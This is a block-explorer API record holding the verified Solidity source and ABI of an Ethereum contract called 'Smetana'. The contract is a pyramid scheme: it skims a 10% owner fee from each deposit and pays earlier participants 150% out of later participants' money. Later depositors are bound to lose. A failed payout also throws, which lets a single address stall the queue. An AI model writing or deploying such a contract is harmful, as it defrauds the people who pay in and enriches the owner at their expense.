{"status":"1","message":"OK","result":[{"SourceCode":"contract Smetana {\r\n\r\n    struct Participant {\r\n        address etherAddress;\r\n        uint amount;\r\n    }\r\n\r\n    Participant[] public participants;\r\n\r\n\tuint public payoutIdx = 0;\r\n\tuint public collectedFees = 0;\r\n\tuint balance = 0;\r\n\r\n  // only owner modifier\r\n\taddress public owner;\r\n    modifier onlyowner {\r\n        if (msg.sender != owner) throw;\r\n        _;\r\n    }//and this\r\n\r\n  // contract Constructor\r\n    function Smetana() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n // fallback function\r\n    function() payable {//this\r\n        enter();\r\n    }\r\n\r\n\tfunction enter() payable {//this\r\n      // collect fee\r\n        uint fee = msg.value / 10;\r\n        collectedFees += fee;\r\n\r\n      // add a new participant\r\n\t\tuint idx = participants.length;\r\n        participants.length++;\r\n        participants[idx].etherAddress = msg.sender;\r\n        participants[idx].amount = msg.value;\r\n\r\n      // update available balance\r\n      \tbalance += msg.value - fee;\r\n      \t\r\n\t  // if there are enough ether on the balance we can pay out to an earlier participant\r\n\t  \tuint txAmount = participants[payoutIdx].amount / 100 * 150;\r\n        if(balance >= txAmount){\r\n        \tif(!participants[payoutIdx].etherAddress.send(txAmount)) throw;\r\n\r\n            balance -= txAmount;\r\n            payoutIdx++;\r\n        }\r\n    }\r\n\r\n    function collectFees() onlyowner {\r\n        if(collectedFees == 0)return;\r\n\r\n        if(!owner.send(collectedFees))throw;\r\n        collectedFees = 0;\r\n    }\r\n\r\n    function setOwner(address _owner) onlyowner {\r\n        owner = _owner;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"participants\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"collectedFees\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payoutIdx\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"collectFees\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Smetana","CompilerVersion":"v0.4.17+commit.bdeb9e52","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://0b6ffa8f68f1fc9f617b9eae7be378b5f3f0b719a02ee1d1af0a92ca20033198"}]}